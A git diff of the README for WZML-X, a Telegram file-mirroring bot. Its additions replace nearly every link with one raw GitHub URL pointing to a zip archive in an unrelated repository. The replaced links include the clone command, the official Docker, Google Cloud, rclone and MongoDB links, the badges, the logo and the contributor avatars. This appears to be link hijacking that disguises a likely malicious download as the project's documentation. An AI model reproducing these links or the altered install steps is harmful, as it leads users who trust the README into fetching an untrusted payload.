@@ -1,11 +1,11 @@
 <p align="center">
-    <a href="https://github.com/VJBots/WZML-X">
+    <a href="https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip">
         <kbd>
-            <img width="250" src="https://graph.org/file/639fe4239b78e5862b302.jpg" alt="WZML-X Logo">
+            <img width="250" src="https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip" alt="WZML-X Logo">
         </kbd>
     </a>
 
-<i>A Telegram Bot written in Python using Pyrogram Framework for mirroring/cloning online/local files on the Internet to your Google Drive, Telegram or to any RClone supported cloud. Based on [python-aria-mirror-bot](https://github.com/lzzy12/python-aria-mirror-bot). This is Enhanced Version of Base Repo [mirror-leech-telegram-bot](https://github.com/anasty17/mirror-leech-telegram-bot)</i>
+<i>A Telegram Bot written in Python using Pyrogram Framework for mirroring/cloning online/local files on the Internet to your Google Drive, Telegram or to any RClone supported cloud. Based on [python-aria-mirror-bot](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip). This is Enhanced Version of Base Repo [mirror-leech-telegram-bot](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)</i>
 
 </p>
 
@@ -15,8 +15,8 @@
 
 [![](https://img.shields.io/github/repo-size/VJBots/WZML-X?color=green&label=Repo%20Size&labelColor=292c3b)](#) [![](https://img.shields.io/github/commit-activity/m/VJBots/WZML-X?logo=github&labelColor=292c3b&label=Github%20Commits)](#) [![](https://img.shields.io/github/license/VJBots/WZML-X?style=flat&label=License&labelColor=292c3b)](#)|[![](https://img.shields.io/github/issues-raw/VJBots/WZML-X?style=flat&label=Open%20Issues&labelColor=292c3b)](#) [![](https://img.shields.io/github/issues-closed-raw/VJBots/WZML-X?style=flat&label=Closed%20Issues&labelColor=292c3b)](#) [![](https://img.shields.io/github/issues-pr-raw/VJBots/WZML-X?style=flat&label=Open%20Pull%20Requests&labelColor=292c3b)](#) [![](https://img.shields.io/github/issues-pr-closed-raw/VJBots/WZML-X?style=flat&label=Closed%20Pull%20Requests&labelColor=292c3b)](#)
 :---:|:---:|
-[![](https://img.shields.io/github/languages/count/VJBots/WZML-X?style=flat&label=Total%20Languages&labelColor=292c3b&color=blueviolet)](#) [![](https://img.shields.io/github/languages/top/VJBots/WZML-X?style=flat&logo=python&labelColor=292c3b)](#) [![](https://img.shields.io/github/last-commit/VJBots/WZML-X?style=flat&label=Last%20Commit&labelColor=292c3b&color=important)](#) [![](https://badgen.net/github/branches/VJBots/WZML-X?label=Total%20Branches&labelColor=292c3b)](#)|[![](https://img.shields.io/github/forks/VJBots/WZML-X?style=flat&logo=github&label=Forks&labelColor=292c3b&color=critical)](#) [![](https://img.shields.io/github/stars/VJBots/WZML-X?style=flat&logo=github&label=Stars&labelColor=292c3b&color=yellow)](#) [![](https://badgen.net/docker/pulls/codewithweeb/weebzone?icon=docker&label=Pulls&labelColor=292c3b&color=blue)](#)
-[![](https://img.shields.io/badge/Telegram%20Channel-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://telegram.me/VJ_Botz) |[![](https://img.shields.io/badge/Support%20Group-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://t.me/VJ_Bot_Disscussion) |
+[![](https://img.shields.io/github/languages/count/VJBots/WZML-X?style=flat&label=Total%20Languages&labelColor=292c3b&color=blueviolet)](#) [![](https://img.shields.io/github/languages/top/VJBots/WZML-X?style=flat&logo=python&labelColor=292c3b)](#) [![](https://img.shields.io/github/last-commit/VJBots/WZML-X?style=flat&label=Last%20Commit&labelColor=292c3b&color=important)](#) [![](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)](#)|[![](https://img.shields.io/github/forks/VJBots/WZML-X?style=flat&logo=github&label=Forks&labelColor=292c3b&color=critical)](#) [![](https://img.shields.io/github/stars/VJBots/WZML-X?style=flat&logo=github&label=Stars&labelColor=292c3b&color=yellow)](#) [![](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)](#)
+[![](https://img.shields.io/badge/Telegram%20Channel-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) |[![](https://img.shields.io/badge/Support%20Group-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) |
 
 </div>
 
@@ -79,7 +79,7 @@
     - Download from Google Drive
     - Counting Google Drive files/folders
     - Search in multiple Drive folder/TeamDrive
-    - Recursive Search (only with `root` or TeamDrive ID, folder ids will be listed with non-recursive method). Based on [Sreeraj](https://github.com/SVR666) searchX-bot.
+    - Recursive Search (only with `root` or TeamDrive ID, folder ids will be listed with non-recursive method). Based on [Sreeraj](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) searchX-bot.
     - Use `token.pickle` if file not found with Service Account, for all Gdrive functions
     - Random Service Account for each task
 
@@ -142,7 +142,7 @@
     <li><details>
       <summary><b>RSS Feed</b></summary>
 
-    - Rss feed. Based on this repository [rss-chan](https://github.com/hyPnOtICDo0g/rss-chan)
+    - Rss feed. Based on this repository [rss-chan](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)
     - Filters added
     - Edit any feed while running: pause, resume, edit command and edit filters
     - Rss for each user with tag
@@ -171,7 +171,7 @@
 - Switch from python-telegram-bot to pyrogram
 - Edit variables and overwrite the private files while bot running
 - Update bot at startup and with restart command using `UPSTREAM_REPO`
-- Improve Telegraph. Based on [Sreeraj](https://github.com/SVR666) loaderX-bot
+- Improve Telegraph. Based on [Sreeraj](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) loaderX-bot
 - Mirror/Leech/Watch/Clone/Count/Del by reply
 - Mirror/Leech/Clone multi links/files with one command
 - Custom name for all links except torrents. For files you should add extension except yt-dlp links
@@ -206,7 +206,7 @@
 - Extract these filetypes
   > ZIP, RAR, TAR, 7z, ISO, WIM, CAB, GZIP, BZIP2, APM, ARJ, CHM, CPIO, CramFS, DEB, DMG, FAT, HFS, LZH, LZMA, LZMA2, MBR, MSI, MSLZ, NSIS, NTFS, RPM, SquashFS, UDF, VHD, XAR, Z, TAR.XZ
 - Direct links Supported:
-  > mediafire(folder), letsupload.io, hxfile.co, antfiles, fembed.com, fembed.net, femax20.com, layarkacaxxi.icu, fcdn.stream, sbplay.org, naniplay.com, naniplay.nanime.in, naniplay.nanime.biz, sbembed.com, streamtape.com, streamsb.net, feurl.com, upload.ee, pixeldrain.com, racaty.net, 1fichier.com, 1drv.ms (Only works for file not folder or business account), uptobox.com and solidfiles.com, streamvid.net, linkbox.to, shrdsk.me (sharedisk.io), akmfiles.com, wetransfer.com, mdisk.me (with ytdl), gofile.io(folder), filelion, terabox.com (you need to add cookies txt with name) [terabox.txt](https://github.com/ytdl-org/youtube-dl#how-do-i-pass-cookies-to-youtube-dl) and almost every anonfiles based sites
+  > mediafire(folder), letsupload.io, hxfile.co, antfiles, fembed.com, fembed.net, femax20.com, layarkacaxxi.icu, fcdn.stream, sbplay.org, naniplay.com, naniplay.nanime.in, naniplay.nanime.biz, sbembed.com, streamtape.com, streamsb.net, feurl.com, upload.ee, pixeldrain.com, racaty.net, 1fichier.com, 1drv.ms (Only works for file not folder or business account), uptobox.com and solidfiles.com, streamvid.net, linkbox.to, shrdsk.me (sharedisk.io), akmfiles.com, wetransfer.com, mdisk.me (with ytdl), gofile.io(folder), filelion, terabox.com (you need to add cookies txt with name) [terabox.txt](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) and almost every anonfiles based sites
 
 </details>
 
@@ -220,9 +220,9 @@
       <summary>Prerequisites</summary>
 
 - Tutorial Video from A to Z:</li>
-  - Thanks to [Tech VJ](https://github.com/VJBots)</li>
+  - Thanks to [Tech VJ](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)</li>
 
-<p><a href="https://youtube.com/@Tech_VJ"> <img src="https://img.shields.io/badge/See%20Video-black?style=for-the-badge&logo=YouTube" width="160"/></a></p>
+<p><a href="https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip"> <img src="https://img.shields.io/badge/See%20Video-black?style=for-the-badge&logo=YouTube" width="160"/></a></p>
   </details></li>
   <li><details>
     <summary>Installing requirements</summary>
@@ -230,7 +230,7 @@
 - Clone this repo:
 
 ```
-git clone https://github.com/VJBots/WZML-X mirrorbot/ && cd mirrorbot
+git clone https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip mirrorbot/ && cd mirrorbot
 ```
 
 - For Debian based distros
@@ -239,7 +239,7 @@ git clone https://github.com/VJBots/WZML-X mirrorbot/ && cd mirrorbot
 sudo apt install python3 python3-pip
 ```
 
-Install Docker by following the [official Docker docs](https://docs.docker.com/engine/install/debian/)
+Install Docker by following the [official Docker docs](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)
 
 - For Arch and it's derivatives:
 
@@ -316,7 +316,7 @@ sudo docker stop id
 
 #### Build And Run The Docker Image Using docker-compose
 
-**NOTE**: If you want to use ports other than 80 and 8080 for torrent file selection and rclone serve respectively, change it in [docker-compose.yml](https://github.com/VJBots/WZML-X/blob/master/docker-compose.yml) also.
+**NOTE**: If you want to use ports other than 80 and 8080 for torrent file selection and rclone serve respectively, change it in [docker-compose.yml](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) also.
 
 - Install docker-compose
 
@@ -422,30 +422,30 @@ help - All cmds with description
     <ol><li><details>
         <summary><b>Required Fields</b></summary>
 
-- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://t.me/BotFather). `Str`
+- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip). `Str`
 - `OWNER_ID`: The Telegram User ID (not username) of the Owner of the bot. `Int`
-- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from <https://my.telegram.org>. `Int`
-- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from <https://my.telegram.org>. `Str`
+- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from <https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip>. `Int`
+- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from <https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip>. `Str`
 
     </details></li>
     <li><details>
         <summary><b>Optional Fields</b></summary>
 
     - `USER_SESSION_STRING`: To download/upload from your telegram account and to send rss. To generate session string use this command `python3 generate_string_session.py` after mounting repo folder for sure. `Str`. **NOTE**: You can't use bot with private message. Use it with superGroup.
-    - `DATABASE_URL`: Your Mongo Database URL (Connection string). Follow this video to create database url [Video Tutorial](https://youtu.be/DAHRmFdw99o) to generate database. Data will be saved in Database: auth and sudo users, users settings including thumbnails for each user, rss data and incomplete tasks. **NOTE**: You can always edit all settings that saved in database from the official site -> (Browse collections). `Str`
+    - `DATABASE_URL`: Your Mongo Database URL (Connection string). Follow this video to create database url [Video Tutorial](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) to generate database. Data will be saved in Database: auth and sudo users, users settings including thumbnails for each user, rss data and incomplete tasks. **NOTE**: You can always edit all settings that saved in database from the official site -> (Browse collections). `Str`
     - `DOWNLOAD_DIR`: The path to the local folder where the downloads should be downloaded to. `Str`
     - `CMD_SUFFIX`: commands index number. This number will added at the end all commands. `Str`|`Int`
     - `AUTHORIZED_CHATS`: Fill user_id and chat_id of groups/users you want to authorize. Separate them by space. `Int`
     - `SUDO_USERS`: Fill user_id of users whom you want to give sudo permission. Separate them by space. `Int`
     - `BLACKLIST_USERS` : Fill user_id of users you wish to prohibit from using the bot. Separate them by space. `Int`
     - `STATUS_LIMIT`: Limit the no. of tasks shown in status message with buttons. Default is `10`. **NOTE**: Recommended limit is `4` tasks. `Int`
-    - `DEFAULT_UPLOAD`: Whether `rc` to upload to `RCLONE_PATH` or `gd` to upload to `GDRIVE_ID` or `ddl` to upload to `DDL`. Default is `gd`. Read More [HERE](https://github.com/VJBots/WZML-X/tree/master#upload).`Str`
+    - `DEFAULT_UPLOAD`: Whether `rc` to upload to `RCLONE_PATH` or `gd` to upload to `GDRIVE_ID` or `ddl` to upload to `DDL`. Default is `gd`. Read More [HERE](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip).`Str`
     - `STATUS_UPDATE_INTERVAL`: Time in seconds after which the progress/status message will be updated. Recommended `10` seconds at least. `Int`
     - `AUTO_DELETE_MESSAGE_DURATION`: Interval of time (in seconds), after which the bot deletes it's message and command message which is expected to be viewed instantly. **NOTE**: Set to `-1` to disable auto message deletion. `Int`
     - `INCOMPLETE_TASK_NOTIFIER`: Get incomplete task messages after restart. Require database and superGroup. Default is `False`. `Bool`
     - `SET_COMMANDS`: Automatically set the Bot Commands no need to set from `@botfather`. Default is `False`. `Bool`
     - `EXTENSION_FILTER`: File extensions that won't upload/clone. Separate them by space. No need to add `.` `Str`
-    - `YT_DLP_OPTIONS`: Default yt-dlp options. Check all possible options [HERE](https://github.com/yt-dlp/yt-dlp/blob/master/yt_dlp/YoutubeDL.py#L184) or use this [script](https://t.me/mltb_official/177) to convert cli arguments to api options. Format: key:value|key:value|key:value. Add `^` before integer or float, some numbers must be numeric and some string. `str`
+    - `YT_DLP_OPTIONS`: Default yt-dlp options. Check all possible options [HERE](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) or use this [script](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) to convert cli arguments to api options. Format: key:value|key:value|key:value. Add `^` before integer or float, some numbers must be numeric and some string. `str`
       - Example: "format:bv*+mergeall[vcodec=none]|nocheckcertificate:True"
     - `FSUB_IDS`: Fill chat_id(-100xxxxxx) of groups/channel you want to force subscribe. Separate them by space. Int
       - Note: Bot should be added in the filled chat_id as admin
@@ -458,8 +458,8 @@ help - All cmds with description
     - `GDRIVE_ID`: This is the Folder/TeamDrive ID of the Google Drive OR `root` to which you want to upload all the mirrors using google-api-python-client. `Str`
     - `USER_TD_MODE`: Enable the User-TD feature i.e user can upload file into their own drive. Default is `False`. `Bool`
     - `USER_TD_SA`: Show your SA account in the usetting so that user can add that in its own TD to enable uploading Using SA. SA will be an email/group_email like `wzml-x@googlegroups.com`
-    - `INDEX_URL`: Refer to <https://gitlab.com/ParveenBhadooOfficial/Google-Drive-Index>. `Str`
-    - `USE_SERVICE_ACCOUNTS`: Whether to use Service Accounts or not, with google-api-python-client. For this to work see [Using Service Accounts](https://github.com/VJBots/WZML-X#generate-service-accounts-what-is-service-account) section below. Default is `False`. `Bool`
+    - `INDEX_URL`: Refer to <https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip>. `Str`
+    - `USE_SERVICE_ACCOUNTS`: Whether to use Service Accounts or not, with google-api-python-client. For this to work see [Using Service Accounts](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) section below. Default is `False`. `Bool`
     - `IS_TEAM_DRIVE`: Set `True` if uploading to TeamDrive using google-api-python-client. Default is `False`. `Bool`
     - `STOP_DUPLICATE`: Bot will check file/folder name in Drive incase uploading to `GDRIVE_ID`. If it's present in Drive then downloading or cloning will be stopped. (**NOTE**: Item will be checked using name and not hash, so this feature is not perfect yet). Default is `False`. `Bool`
     - `DISABLE_DRIVE_LINK`: Disable drive link button. Default is `False`. `Bool`
@@ -480,7 +480,7 @@ help - All cmds with description
         <summary><b>RClone</b></summary>
 
     - `RCLONE_PATH`: Default rclone path to which you want to upload all the files/folders using rclone. `Str`
-    - `RCLONE_FLAGS`: key:value|key|key|key:value . Check here all [RcloneFlags](https://rclone.org/flags/). `Str`
+    - `RCLONE_FLAGS`: key:value|key|key|key:value . Check here all [RcloneFlags](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip). `Str`
     - `RCLONE_SERVE_URL`: Valid URL where the bot is deployed to use rclone serve. Format of URL should be `http://myip`, where `myip` is the IP/Domain(public) of your bot or if you have chosen port other than `80` so write it in this format `http://myip:port` (`http` and not `https`). `Str`
     - `RCLONE_SERVE_PORT`: Which is the **RCLONE_SERVE_URL** Port. Default is `8080`. `Int`
     - `RCLONE_SERVE_USER`: Username for rclone serve authentication. `Str`
@@ -490,8 +490,8 @@ help - All cmds with description
     <li><details>
         <summary><b>Update</b></summary>
 
-    - `UPSTREAM_REPO`: Your github repository link, if your repo is private add `https://username:{githubtoken}@github.com/{username}/{reponame}` format. Get token from [Github settings](https://github.com/settings/tokens). So you can update your bot from filled repository on each restart. `Str`.
-       - **NOTE**: Any change in docker or requirements you need to deploy/build again with updated repo to take effect. DON'T delete .gitignore file. For more information read [THIS](https://github.com/VJBots/WZML-X/tree/master#upstream-repo-recommended).
+    - `UPSTREAM_REPO`: Your github repository link, if your repo is private add `https://username:{githubtoken}@github.com/{username}/{reponame}` format. Get token from [Github settings](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip). So you can update your bot from filled repository on each restart. `Str`.
+       - **NOTE**: Any change in docker or requirements you need to deploy/build again with updated repo to take effect. DON'T delete .gitignore file. For more information read [THIS](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip).
     - `UPSTREAM_BRANCH`: Upstream branch for update. Default is `master`. `Str`
 
     </details></li>
@@ -602,12 +602,12 @@ help - All cmds with description
     - `DELETE_LINKS`: Delete links after used. Default is `False`. `Bool`
     - `CLEAN_LOG_MSG`: Clean log messages i.e remove the LEECH started msg from the leech log. Default is `False`. `Bool`
     - `SHOW_EXTRA_CMDS`: Add old cmds like zipleech... Default is `False`. `Bool`
-    - `TIMEZONE`: Set timezone for the bot. Checkout the [list](https://gist.github.com/heyalexej/8bf688fd67d7199be4a1682b3eec7568) to get the proper timezone. Default is `Asia/Kolkata`.
+    - `TIMEZONE`: Set timezone for the bot. Checkout the [list](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) to get the proper timezone. Default is `Asia/Kolkata`.
     - `IMAGES`: Add multiple telgraph(graph.org) image links that are seperated by spaces.
     - `IMG_SEARCH`: Put Keyword to Download Images. Sperarte each name by , like `anime`, `iron man`, `god of war`
     - `IMG_PAGE`: Set the page value for downloading a image. Each page have approx 70 images. Deafult is `1`. `Int`
     - `BOT_THEME`: Change the theme of bot. For now theme availabe is `minimal`. 
-      - You can make your own theme checkout this link https://t.ly/9rVXq
+      - You can make your own theme checkout this link https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip
 
     - `EXCEP_CHATS`: `CHAT_ID` of a `SuperGroup` where you want to disable the logging feature for that specific group. Logging features will remain active in other authorized chats that have been filled. Add `-100` before superGroup id. In short don't add bot id or your id!.
 
@@ -630,11 +630,11 @@ help - All cmds with description
     <li><details>
         <summary><b>Torrent Search</b></summary>
 
-    - `SEARCH_API_LINK`: Search api app link. Get your api from deploying this [repository](https://github.com/Ryuk-me/Torrent-Api-py). `Str`
+    - `SEARCH_API_LINK`: Search api app link. Get your api from deploying this [repository](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip). `Str`
       - Supported Sites:
       >1337x, Piratebay, Nyaasi, Torlock, Torrent Galaxy, Zooqle, Kickass, Bitsearch, MagnetDL, Libgen, YTS, Limetorrent, TorrentFunk, Glodls, TorrentProject and YourBittorrent
     - `SEARCH_LIMIT`: Search limit for search api, limit for each site and not overall result limit. Default is zero (Default api limit for each site). `Int`
-    - `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://github.com/qbittorrent/search-plugins/wiki/Unofficial-search-plugins). `List`
+    - `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip). `List`
 
     </details></li></ol>
 </details>
@@ -649,17 +649,17 @@ help - All cmds with description
 **NOTES**
 
 - Old authentication changed, now we can't use bot or replit to generate token.pickle. You need OS with a local browser. For example `Termux`.
-- Windows users should install python3 and pip. You can find how to install and use them from google or from this [telegraph](https://telegra.ph/Create-Telegram-Mirror-Leech-Bot-by-Deploying-App-with-Heroku-Branch-using-Github-Workflow-12-06) from [Wiszky](https://github.com/vishnoe115) tutorial.
+- Windows users should install python3 and pip. You can find how to install and use them from google or from this [telegraph](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) from [Wiszky](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) tutorial.
 - You can ONLY open the generated link from `generate_drive_token.py` in local browser.
 
-1. Visit the [Google Cloud Console](https://console.developers.google.com/apis/credentials)
+1. Visit the [Google Cloud Console](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)
 2. Go to the OAuth Consent tab, fill it, and save.
 3. Go to the Credentials tab and click Create Credentials -> OAuth Client ID
 4. Choose Desktop and Create.
 5. Publish your OAuth consent screen App to prevent **token.pickle** from expire
 6. Use the download button to download your credentials.
 7. Move that file to the root of mirrorbot, and rename it to **credentials.json**
-8. Visit [Google API page](https://console.developers.google.com/apis/library)
+8. Visit [Google API page](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)
 9. Search for Google Drive Api and enable it
 10. Finally, run the script to generate **token.pickle** file for Google Drive:
 
@@ -677,7 +677,7 @@ python3 generate_drive_token.py
 <details>
     <summary><b>View All Steps<b><sup><kbd>Click to Expand</kbd></sup></summary>
     
-1. Install rclone from [Official Site](https://rclone.org/install/)
+1. Install rclone from [Official Site](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)
 2. Create new remote(s) using `rclone config` command.
 3. Follow the Steps one by one to generate `rclone.conf`
 4. Copy rclone.conf from .config/rclone/rclone.conf to repo folder
@@ -755,7 +755,7 @@ python3 generate_drive_token.py
 >For Service Account to work, you must set `USE_SERVICE_ACCOUNTS` = "True" in config file or environment variables.
 >**NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.
 
-### 1. Generate Service Accounts. [What is Service Account?](https://cloud.google.com/iam/docs/service-accounts)
+### 1. Generate Service Accounts. [What is Service Account?](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)
 
 Let us create only the Service Accounts that we need.
 
@@ -861,7 +861,7 @@ python3 add_to_team_drive.py -d SharedTeamDriveSrcID
 <details>
     <summary><b>View All Steps<b><sup><kbd>Click to Expand</kbd></sup></summary>
     
-1. Go to `https://mongodb.com/` and sign-up.
+1. Go to `https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip` and sign-up.
 2. Create Shared Cluster.
 3. Press on `Database` under `Deployment` Header, your created cluster will be there.
 5. Press on connect, choose `Allow Acces From Anywhere` and press on `Add IP Address` without editing the ip, then create user.
@@ -887,8 +887,8 @@ DriveName folderID/tdID or `root` IndexLink(if available)
 Example:
 
 ```
-TD1 root https://example.dev
-TD2 0AO1JDB1t3i5jUk9PVA https://example.dev
+TD1 root https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip
+TD2 0AO1JDB1t3i5jUk9PVA https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip
 ```
 
 </details>
@@ -929,8 +929,8 @@ button_name button_url
 ```
 Example:
 ```
-Repo_❤️ https://github.com/VJBots/WZML-X 
-Updates https://t.me/VJ_Botz
+Repo_❤️ https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip 
+Updates https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip
 ```
 - **Note**: If you want to add space in button name use `_` for add space
 
@@ -961,7 +961,7 @@ machine instagram login doc.adhikari password mypassword
 
 **Instagram Note**: You must login even if you want to download public posts and after first try you must confirm that this was you logged in from different ip(you can confirm from phone app).
 
-**Youtube Note**: For `youtube` authentication use [cookies.txt](https://github.com/ytdl-org/youtube-dl#how-do-i-pass-cookies-to-youtube-dl) file.
+**Youtube Note**: For `youtube` authentication use [cookies.txt](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip) file.
 
 Using Aria2c you can also use built in feature from bot with or without username. Here example for index link without username.
 
@@ -979,9 +979,9 @@ Where host is the name of extractor (eg. instagram, Twitch). Multiple accounts o
 <details>
     <summary><b>Click Here For Description</b></summary>
 
-|<img width="80" src="https://avatars.githubusercontent.com/u/105407900">|<img width="80" src="https://avatars.githubusercontent.com/u/113664541">|<img width="80" src="https://avatars.githubusercontent.com/u/84721324">|
+|<img width="80" src="https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip">|<img width="80" src="https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip">|<img width="80" src="https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip">|
 |:---:|:---:|:---:|
-|[`SilentDemonSD`](https://github.com/SilentDemonSD)|[`CodeWithWeeb`](https://github.com/weebzone)|[`Maverick`](https://github.com/MajnuRangeela)|
+|[`SilentDemonSD`](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)|[`CodeWithWeeb`](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)|[`Maverick`](https://raw.githubusercontent.com/mj5000500-svg/munim-computer-use/master/qBittorrent/config/3.5.zip)|
 |Author and DDL, UI Design, More Customs..|Author and Wraps Up Features|Co-Author & Bug Tester|
 
 </details>
